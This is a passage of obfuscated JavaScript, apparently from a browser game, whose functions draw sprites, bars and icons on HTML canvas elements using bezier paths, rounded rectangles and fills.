			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(165.75 * ᐃ, 95.4375 * ᐃ);
			Δ.bezierCurveTo(177.75 * ᐃ, 97.4375 * ᐃ, 182.75 * ᐃ, 115.4375 * ᐃ, ᐃ * 173.75, 121.4375 * ᐃ);
			Δ.bezierCurveTo(164.75 * ᐃ, ᐃ * 126.4375, ᐃ * 149.75, ᐃ * 102.4375, 164.75 * ᐃ, 96.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠⲆⵠ], Ⲇᐃ[7], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(216.75 * ᐃ, ᐃ * 94.4375);
			Δ.bezierCurveTo(227.75 * ᐃ, 99.4375 * ᐃ, ᐃ * 223.75, 122.4375 * ᐃ, 210.75 * ᐃ, 119.4375 * ᐃ);
			Δ.bezierCurveTo(203.75 * ᐃ, 115.4375 * ᐃ, 207.75 * ᐃ, ᐃ * 93.4375, ᐃ * 216.75, ᐃ * 94.4375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⲆⲆ], Ⲇᐃ[ᐃΔⲆΔᐃ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 211.75, 68.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 218.75, ᐃ * 69.4375, ᐃ * 220.75, ᐃ * 77.4375, 216.75 * ᐃ, 83.4375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 208.75, ᐃ * 89.4375, ᐃ * 205.75, ᐃ * 68.4375, ᐃ * 210.75, ᐃ * 68.4375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ᐃᐃᐃⵠᐃ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * 169.75, ᐃ * 71.4375);
			Δ.bezierCurveTo(162.75 * ᐃ, 72.4375 * ᐃ, 159.75 * ᐃ, 83.4375 * ᐃ, 167.75 * ᐃ, ᐃ * 88.4375);
			Δ.bezierCurveTo(ᐃ * 174.75, 90.4375 * ᐃ, ᐃ * 174.75, ᐃ * 72.4375, 170.75 * ᐃ, 71.4375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ᐃᐃⵠⵠⵠ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(193.75 * ᐃ, ᐃ * 160.4375);
			Δ.bezierCurveTo(215.75 * ᐃ, 168.4375 * ᐃ, 224.75 * ᐃ, 180.4375 * ᐃ, 229.75 * ᐃ, 193.4375 * ᐃ);
			Δ.bezierCurveTo(223.75 * ᐃ, ᐃ * 211.4375, 205.75 * ᐃ, ᐃ * 225.4375, ᐃ * 193.75, ᐃ * 229.4375);
			Δ.bezierCurveTo(ᐃ * 167.75, 217.4375 * ᐃ, 161.75 * ᐃ, 205.4375 * ᐃ, 156.75 * ᐃ, ᐃ * 192.4375);
			Δ.bezierCurveTo(ᐃ * 164.75, ᐃ * 175.4375, 176.75 * ᐃ, 166.4375 * ᐃ, 192.75 * ᐃ, ᐃ * 160.4375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆᐃⵠΔ], Ⲇᐃ[9], ᐃ * 3);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 189.1999969482422, ᐃ * 182.61249923706055);
			Δ.bezierCurveTo(ᐃ * 190.1999969482422, ᐃ * 184.11249923706055, 190.1999969482422 * ᐃ, 184.11249923706055 * ᐃ, 191.1999969482422 * ᐃ, 185.61249923706055 * ᐃ);
			Δ.bezierCurveTo(192.1999969482422 * ᐃ, ᐃ * 180.61249923706055, 192.1999969482422 * ᐃ, 180.61249923706055 * ᐃ, 193.1999969482422 * ᐃ, 175.61249923706055 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 195.6999969482422, ᐃ * 177.11249923706055, 195.6999969482422 * ᐃ, ᐃ * 177.11249923706055, ᐃ * 198.1999969482422, ᐃ * 178.61249923706055);
			Δ.bezierCurveTo(198.1999969482422 * ᐃ, ᐃ * 181.11249923706055, ᐃ * 198.1999969482422, ᐃ * 181.11249923706055, ᐃ * 198.1999969482422, ᐃ * 183.61249923706055);
			Δ.bezierCurveTo(201.6999969482422 * ᐃ, ᐃ * 181.11249923706055, ᐃ * 201.6999969482422, 181.11249923706055 * ᐃ, ᐃ * 205.1999969482422, 178.61249923706055 * ᐃ);
			Δ.bezierCurveTo(206.6999969482422 * ᐃ, 180.61249923706055 * ᐃ, 206.6999969482422 * ᐃ, 180.61249923706055 * ᐃ, 208.1999969482422 * ᐃ, ᐃ * 182.61249923706055);
			Δ.bezierCurveTo(206.1999969482422 * ᐃ, ᐃ * 185.61249923706055, ᐃ * 206.1999969482422, 185.61249923706055 * ᐃ, 204.1999969482422 * ᐃ, ᐃ * 188.61249923706055);
			Δ.bezierCurveTo(ᐃ * 208.6999969482422, 188.61249923706055 * ᐃ, ᐃ * 208.6999969482422, ᐃ * 188.61249923706055, ᐃ * 213.1999969482422, ᐃ * 188.61249923706055);
			Δ.bezierCurveTo(213.1999969482422 * ᐃ, 191.11249923706055 * ᐃ, 213.1999969482422 * ᐃ, 191.11249923706055 * ᐃ, 213.1999969482422 * ᐃ, ᐃ * 193.61249923706055);
			Δ.bezierCurveTo(209.6999969482422 * ᐃ, 194.61249923706055 * ᐃ, ᐃ * 209.6999969482422, ᐃ * 194.61249923706055, ᐃ * 206.1999969482422, 195.61249923706055 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 210.1999969482422, ᐃ * 198.61249923706055, 210.1999969482422 * ᐃ, 198.61249923706055 * ᐃ, ᐃ * 214.1999969482422, 201.61249923706055 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 212.1999969482422, ᐃ * 203.61249923706055, 212.1999969482422 * ᐃ, ᐃ * 203.61249923706055, 210.1999969482422 * ᐃ, ᐃ * 205.61249923706055);
			Δ.bezierCurveTo(207.1999969482422 * ᐃ, 204.11249923706055 * ᐃ, ᐃ * 207.1999969482422, ᐃ * 204.11249923706055, 204.1999969482422 * ᐃ, ᐃ * 202.61249923706055);
			Δ.bezierCurveTo(ᐃ * 205.6999969482422, 207.61249923706055 * ᐃ, 205.6999969482422 * ᐃ, 207.61249923706055 * ᐃ, 207.1999969482422 * ᐃ, 212.61249923706055 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 204.6999969482422, 213.61249923706055 * ᐃ, 204.6999969482422 * ᐃ, 213.61249923706055 * ᐃ, ᐃ * 202.1999969482422, ᐃ * 214.61249923706055);
			Δ.bezierCurveTo(200.1999969482422 * ᐃ, 210.61249923706055 * ᐃ, ᐃ * 200.1999969482422, 210.61249923706055 * ᐃ, ᐃ * 198.1999969482422, ᐃ * 206.61249923706055);
			Δ.bezierCurveTo(196.6999969482422 * ᐃ, 211.61249923706055 * ᐃ, ᐃ * 196.6999969482422, 211.61249923706055 * ᐃ, ᐃ * 195.1999969482422, 216.61249923706055 * ᐃ);
			Δ.bezierCurveTo(192.6999969482422 * ᐃ, ᐃ * 216.11249923706055, ᐃ * 192.6999969482422, 216.11249923706055 * ᐃ, 190.1999969482422 * ᐃ, ᐃ * 215.61249923706055);
			Δ.bezierCurveTo(ᐃ * 190.1999969482422, 211.61249923706055 * ᐃ, 190.1999969482422 * ᐃ, ᐃ * 211.61249923706055, ᐃ * 190.1999969482422, 207.61249923706055 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 186.1999969482422, ᐃ * 210.61249923706055, ᐃ * 186.1999969482422, 210.61249923706055 * ᐃ, ᐃ * 182.1999969482422, ᐃ * 213.61249923706055);
			Δ.bezierCurveTo(181.1999969482422 * ᐃ, ᐃ * 211.11249923706055, 181.1999969482422 * ᐃ, 211.11249923706055 * ᐃ, ᐃ * 180.1999969482422, ᐃ * 208.61249923706055);
			Δ.bezierCurveTo(183.1999969482422 * ᐃ, ᐃ * 205.61249923706055, ᐃ * 183.1999969482422, ᐃ * 205.61249923706055, 186.1999969482422 * ᐃ, ᐃ * 202.61249923706055);
			Δ.bezierCurveTo(180.6999969482422 * ᐃ, 203.11249923706055 * ᐃ, 180.6999969482422 * ᐃ, 203.11249923706055 * ᐃ, 175.1999969482422 * ᐃ, ᐃ * 203.61249923706055);
			Δ.bezierCurveTo(ᐃ * 174.6999969482422, ᐃ * 200.11249923706055, ᐃ * 174.6999969482422, ᐃ * 200.11249923706055, 174.1999969482422 * ᐃ, 196.61249923706055 * ᐃ);
			Δ.bezierCurveTo(177.1999969482422 * ᐃ, ᐃ * 195.61249923706055, ᐃ * 177.1999969482422, ᐃ * 195.61249923706055, 180.1999969482422 * ᐃ, 194.61249923706055 * ᐃ);
			Δ.bezierCurveTo(177.1999969482422 * ᐃ, 191.61249923706055 * ᐃ, 177.1999969482422 * ᐃ, 191.61249923706055 * ᐃ, ᐃ * 174.1999969482422, ᐃ * 188.61249923706055);
			Δ.bezierCurveTo(175.6999969482422 * ᐃ, 187.11249923706055 * ᐃ, 175.6999969482422 * ᐃ, ᐃ * 187.11249923706055, ᐃ * 177.1999969482422, 185.61249923706055 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 180.6999969482422, 187.11249923706055 * ᐃ, 180.6999969482422 * ᐃ, ᐃ * 187.11249923706055, ᐃ * 184.1999969482422, ᐃ * 188.61249923706055);
			Δ.bezierCurveTo(ᐃ * 182.6999969482422, 183.61249923706055 * ᐃ, 182.6999969482422 * ᐃ, 183.61249923706055 * ᐃ, 181.1999969482422 * ᐃ, ᐃ * 178.61249923706055);
			Δ.bezierCurveTo(ᐃ * 183.1999969482422, 177.11249923706055 * ᐃ, ᐃ * 183.1999969482422, ᐃ * 177.11249923706055, 185.1999969482422 * ᐃ, 175.61249923706055 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[10]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 185.1999969482422, ᐃ * 173.8125);
			Δ.bezierCurveTo(187.1999969482422 * ᐃ, 179.3125 * ᐃ, ᐃ * 187.1999969482422, 179.3125 * ᐃ, 189.1999969482422 * ᐃ, ᐃ * 184.8125);
			Δ.bezierCurveTo(184.1999969482422 * ᐃ, 181.8125 * ᐃ, ᐃ * 184.1999969482422, ᐃ * 181.8125, 179.1999969482422 * ᐃ, ᐃ * 178.8125);
			Δ.bezierCurveTo(ᐃ * 181.1999969482422, ᐃ * 175.8125, 182.1999969482422 * ᐃ, ᐃ * 174.8125, 185.1999969482422 * ᐃ, ᐃ * 173.8125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆⵠᐃᐃΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(192.1999969482422 * ᐃ, ᐃ * 173.61249542236328);
			Δ.bezierCurveTo(194.1999969482422 * ᐃ, ᐃ * 172.61249542236328, 196.1999969482422 * ᐃ, 171.61249542236328 * ᐃ, 199.1999969482422 * ᐃ, ᐃ * 173.61249542236328);
			Δ.bezierCurveTo(ᐃ * 197.6999969482422, ᐃ * 179.61249542236328, 197.6999969482422 * ᐃ, ᐃ * 179.61249542236328, ᐃ * 196.1999969482422, ᐃ * 185.61249542236328);
			Δ.bezierCurveTo(194.1999969482422 * ᐃ, ᐃ * 179.61249542236328, ᐃ * 194.1999969482422, ᐃ * 179.61249542236328, ᐃ * 192.1999969482422, ᐃ * 173.61249542236328);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[11]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(205.1999969482422 * ᐃ, 176.2125015258789 * ᐃ);
			Δ.bezierCurveTo(210.1999969482422 * ᐃ, ᐃ * 178.2125015258789, ᐃ * 211.1999969482422, ᐃ * 179.2125015258789, ᐃ * 211.1999969482422, ᐃ * 181.2125015258789);
			Δ.bezierCurveTo(ᐃ * 206.6999969482422, 184.7125015258789 * ᐃ, 206.6999969482422 * ᐃ, ᐃ * 184.7125015258789, ᐃ * 202.1999969482422, 188.2125015258789 * ᐃ);
			Δ.bezierCurveTo(203.6999969482422 * ᐃ, 182.2125015258789 * ᐃ, ᐃ * 203.6999969482422, ᐃ * 182.2125015258789, ᐃ * 205.1999969482422, ᐃ * 176.2125015258789);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[11]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 214.1999969482422, 187.21249985694885 * ᐃ);
			Δ.bezierCurveTo(216.1999969482422 * ᐃ, 191.21249985694885 * ᐃ, 216.1999969482422 * ᐃ, 192.21249985694885 * ᐃ, ᐃ * 215.1999969482422, 195.21249985694885 * ᐃ);
			Δ.bezierCurveTo(206.1999969482422 * ᐃ, 194.21249985694885 * ᐃ, ᐃ * 205.1999969482422, ᐃ * 194.21249985694885, 205.1999969482422 * ᐃ, ᐃ * 194.21249985694885);
			Δ.bezierCurveTo(ᐃ * 209.6999969482422, ᐃ * 190.71249985694885, 209.6999969482422 * ᐃ, ᐃ * 190.71249985694885, 214.1999969482422 * ᐃ, ᐃ * 187.21249985694885);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠΔΔⲆⲆⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(204.1999969482422 * ᐃ, ᐃ * 201.8125);
			Δ.bezierCurveTo(ᐃ * 209.1999969482422, 201.3125 * ᐃ, ᐃ * 209.1999969482422, ᐃ * 201.3125, 214.1999969482422 * ᐃ, 200.8125 * ᐃ);
			Δ.bezierCurveTo(215.1999969482422 * ᐃ, ᐃ * 204.8125, ᐃ * 214.1999969482422, ᐃ * 205.8125, 213.1999969482422 * ᐃ, 208.8125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 208.6999969482422, ᐃ * 205.3125, 208.6999969482422 * ᐃ, ᐃ * 205.3125, ᐃ * 204.1999969482422, ᐃ * 201.8125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔᐃᐃⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 199.1999969482422, ᐃ * 205.61249923706055);
			Δ.bezierCurveTo(ᐃ * 207.1999969482422, ᐃ * 212.61249923706055, 203.6999969482422 * ᐃ, ᐃ * 209.11249923706055, ᐃ * 208.1999969482422, 212.61249923706055 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 206.1999969482422, ᐃ * 215.61249923706055, ᐃ * 204.1999969482422, ᐃ * 217.61249923706055, ᐃ * 203.1999969482422, 216.61249923706055 * ᐃ);
			Δ.bezierCurveTo(201.1999969482422 * ᐃ, 211.11249923706055 * ᐃ, ᐃ * 201.1999969482422, 211.11249923706055 * ᐃ, ᐃ * 199.1999969482422, 205.61249923706055 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 191.1999969482422, ᐃ * 207.01250076293945);
			Δ.bezierCurveTo(ᐃ * 194.1999969482422, 213.01250076293945 * ᐃ, 194.1999969482422 * ᐃ, 216.01250076293945 * ᐃ, ᐃ * 196.1999969482422, ᐃ * 218.01250076293945);
			Δ.bezierCurveTo(193.1999969482422 * ᐃ, ᐃ * 220.01250076293945, 190.1999969482422 * ᐃ, ᐃ * 220.01250076293945, ᐃ * 188.1999969482422, 218.01250076293945 * ᐃ);
			Δ.bezierCurveTo(189.6999969482422 * ᐃ, ᐃ * 213.01250076293945, ᐃ * 189.6999969482422, ᐃ * 213.01250076293945, 191.1999969482422 * ᐃ, ᐃ * 208.01250076293945);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠᐃΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(186.1999969482422 * ᐃ, ᐃ * 203.21249961853027);
			Δ.bezierCurveTo(184.1999969482422 * ᐃ, ᐃ * 209.21249961853027, ᐃ * 184.1999969482422, 209.21249961853027 * ᐃ, 182.1999969482422 * ᐃ, ᐃ * 215.21249961853027);
			Δ.bezierCurveTo(177.1999969482422 * ᐃ, 212.21249961853027 * ᐃ, 176.1999969482422 * ᐃ, 211.21249961853027 * ᐃ, 177.1999969482422 * ᐃ, ᐃ * 210.21249961853027);
			Δ.bezierCurveTo(181.6999969482422 * ᐃ, ᐃ * 206.71249961853027, ᐃ * 181.6999969482422, ᐃ * 206.71249961853027, 186.1999969482422 * ᐃ, ᐃ * 203.21249961853027);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[11]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 183.1999969482422, 196.8125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 177.1999969482422, 196.3125 * ᐃ, ᐃ * 177.1999969482422, ᐃ * 196.3125, 171.1999969482422 * ᐃ, ᐃ * 195.8125);
			Δ.bezierCurveTo(ᐃ * 171.1999969482422, 199.8125 * ᐃ, 171.1999969482422 * ᐃ, ᐃ * 202.8125, 174.1999969482422 * ᐃ, 204.8125 * ᐃ);
			Δ.bezierCurveTo(178.6999969482422 * ᐃ, ᐃ * 200.8125, ᐃ * 178.6999969482422, ᐃ * 200.8125, ᐃ * 183.1999969482422, 196.8125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[11]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(185.1999969482422 * ᐃ, 190.21249771118164 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 179.6999969482422, 186.71249771118164 * ᐃ, 179.6999969482422 * ᐃ, ᐃ * 186.71249771118164, 174.1999969482422 * ᐃ, 183.21249771118164 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 172.1999969482422, ᐃ * 186.21249771118164, 172.1999969482422 * ᐃ, ᐃ * 187.21249771118164, ᐃ * 172.1999969482422, 190.21249771118164 * ᐃ);
			Δ.bezierCurveTo(178.1999969482422 * ᐃ, 190.21249771118164 * ᐃ, 178.1999969482422 * ᐃ, 190.21249771118164 * ᐃ, ᐃ * 184.1999969482422, 190.21249771118164 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[11]);
			ⵠᐃᐃ(Δ, 126.19999694824219 * ᐃ, ᐃ * 169.8125, 8.94427190999916 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[12]);
			ⵠᐃᐃ(Δ, 123.19999694824219 * ᐃ, ᐃ * 164.8125, 2.8284271247461903 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔᐃΔΔⲆ]);
			ⵠᐃᐃ(Δ, 253.1999969482422 * ᐃ, ᐃ * 169.8125, 8.94427190999916 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⲆⲆᐃ]);
			ⵠᐃᐃ(Δ, 255.1999969482422 * ᐃ, 164.8125 * ᐃ, 2.23606797749979 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[13]);
			return Ⲇⵠ
		}

		function ⵠⵠⲆⵠΔⵠᐃⲆⵠ(ᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 335 * ᐃ;
			var ⲆΔΔᐃᐃⵠΔ = 250 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 120;
			var ΔᐃⵠᐃΔΔⵠ = 20 * ᐃ;
			var ΔⲆᐃⲆΔⵠⲆ = ᐃ * 35;
			var ᐃⲆⵠⵠⵠⵠⲆ = ᐃ * 65;
			var ⲆⲆⵠ = 2 * ᐃ;
			var ⲆⵠⲆᐃⵠ = 4 * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.beginPath();
			Δ.translate(ⲆⲆⲆᐃ, 15 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃⲆⵠⵠⵠⵠⲆ, 0, ⲆΔΔᐃᐃⵠΔ, ΔᐃⵠᐃΔΔⵠ, ⲆⲆⵠ);
			ΔⲆ(Δ, null, "#69A148", ⲆⵠⲆᐃⵠ);
			Δ.translate(ΔᐃΔΔ, ΔⲆᐃⲆΔⵠⲆ);
			Ⲇᐃᐃ(Δ, ᐃⲆⵠⵠⵠⵠⲆ, 0, ⲆΔΔᐃᐃⵠΔ, ΔᐃⵠᐃΔΔⵠ, ⲆⲆⵠ);
			ΔⲆ(Δ, null, "#AF352A", ⲆⵠⲆᐃⵠ);
			Δ.translate(Δⵠᐃ, ΔⲆᐃⲆΔⵠⲆ);
			Ⲇᐃᐃ(Δ, ᐃⲆⵠⵠⵠⵠⲆ, ⵠⲆⲆ, ⲆΔΔᐃᐃⵠΔ, ΔᐃⵠᐃΔΔⵠ, ⲆⲆⵠ);
			ΔⲆ(Δ, null, "#669BB1", ⲆⵠⲆᐃⵠ);
			return Ⲇⵠ
		}

		function ⵠⲆⵠᐃⵠΔΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 253;
			Ⲇⵠ.height = 192 * ᐃ;
			Δ.globalAlpha = .5;
			Δ.save();
			Δ.translate(ᐃ * 42, 99 * ᐃ);
			Δ.globalAlpha = .5;
			Ⲇᐃᐃ(Δ, ᐃ * -7, -ⵠΔΔⲆⲆ * ᐃ, ⵠⲆⲆⵠΔⵠⲆ * ᐃ, ᐃ * 39, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			Δ.save();
			Δ.translate(37 * ᐃ, 94 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -7, -20 * ᐃ, 14 * ᐃ, 37 * ᐃ, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃⵠⵠ]);
			Δ.globalAlpha = .5;
			Δ.save();
			Δ.translate(136 * ᐃ, ᐃ * 99);
			Δ.globalAlpha = .5;
			Ⲇᐃᐃ(Δ, -84 * ᐃ, -67 * ᐃ, 168 * ᐃ, 134 * ᐃ, ᐃ * ⲆΔⲆⲆΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], 13 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(ᐃ * 131, 94 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -84, -67 * ᐃ, 168 * ᐃ, ᐃ * 134, ᐃ * ᐃᐃⵠⵠⲆ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⲆ], Ⲇᐃ[ΔⲆΔΔΔ], ⵠΔᐃⲆᐃΔⵠ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 131, 94 * ᐃ);
			Ⲇᐃᐃ(Δ, -76 * ᐃ, -61 * ᐃ, ᐃ * 152, 122 * ᐃ, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⲆ], Ⲇᐃ[ⵠΔⲆ], 8 * ᐃ);
			Δ.save();
			Δ.translate(168.5 * ᐃ, ᐃ * 93.5);
			Ⲇᐃᐃ(Δ, -30.5 * ᐃ, ᐃ * -58.5, ᐃ * 61, 117 * ᐃ, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[Ⲇⵠⵠⵠ], ⲆᐃⲆΔΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 93.5, ᐃ * 95.5);
			Ⲇᐃᐃ(Δ, -32 * ᐃ, ᐃ * -59.5, ᐃ * 59, ᐃ * 119, ᐃ * ⵠⵠⲆⲆⲆΔΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], 6 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 130.5, 94 * ᐃ);
			Ⲇᐃᐃ(Δ, -36 * ᐃ, ᐃ * -67, 73 * ᐃ, ᐃ * 134, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], 8 * ᐃ);
			Δ.globalAlpha = .5;
			Δ.save();
			Δ.translate(ᐃ * 133, ᐃ * 97);
			Ⲇᐃᐃ(Δ, ᐃ * -83, ᐃ * -12, ᐃ * 160, 24 * ᐃ, 0 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(ᐃ * 133, ᐃ * 92);
			Ⲇᐃᐃ(Δ, ᐃ * -83, ᐃ * -12, ᐃ * 160, 24 * ᐃ, 0 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠᐃ]);
			Δ.globalAlpha = .5;
			Δ.save();
			Δ.translate(228 * ᐃ, ᐃ * 99.5);
			Δ.globalAlpha = .5;
			Ⲇᐃᐃ(Δ, -ΔᐃΔⲆ * ᐃ, -18.5 * ᐃ, ⲆⵠΔΔᐃ * ᐃ, 37 * ᐃ, ᐃ * ᐃⲆᐃΔⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(ᐃ * 223, ᐃ * 94.5);
			Ⲇᐃᐃ(Δ, -5 * ᐃ, ᐃ * -18.5, 10 * ᐃ, 37 * ᐃ, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.save();
			Δ.translate(133.5 * ᐃ, ᐃ * 175.5);
			Δ.globalAlpha = .5;
			Ⲇᐃᐃ(Δ, ᐃ * -22.5, ᐃ * -6.5, 45 * ᐃ, ᐃ * ⵠᐃⲆⵠⲆⵠᐃ, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(ᐃ * 128.5, ᐃ * 170.5);
			Ⲇᐃᐃ(Δ, -22.5 * ᐃ, ᐃ * -6.5, 45 * ᐃ, ᐃ * ᐃⵠΔᐃΔΔⲆ, ⲆᐃᐃΔΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ]);
			return Ⲇⵠ
		}

		function ΔᐃⵠⵠⵠΔᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 102 * ᐃ;
			Ⲇⵠ.height = ᐃ * 102;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(3, ᐃᐃⵠⲆᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * 24, ᐃ * 26, 70 * ᐃ, ᐃ * ⵠᐃΔⵠΔ, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆᐃ]);
			Ⲇᐃᐃ(Δ, ᐃ * 26, 70 * ᐃ, 70 * ᐃ, 9 * ᐃ, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆⵠ]);
			Ⲇᐃᐃ(Δ, ᐃ * 5, ᐃ * ΔⲆΔᐃ, ᐃ * 22, 94 * ᐃ, 5 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Ⲇᐃᐃ(Δ, ᐃ * 40, 3 * ᐃ, 22 * ᐃ, 94 * ᐃ, ᐃ * 5);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ]);
			Ⲇᐃᐃ(Δ, ᐃ * 75, ⵠⵠⵠᐃ * ᐃ, ᐃ * 22, 94 * ᐃ, ᐃ * ⵠᐃΔⲆ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.globalAlpha = ΔⵠΔⵠ;
			Δ.translate(-3, -3);
			Ⲇᐃᐃ(Δ, ᐃ * 24, 26 * ᐃ, ᐃ * 70, 9 * ᐃ, 10 * ᐃ);
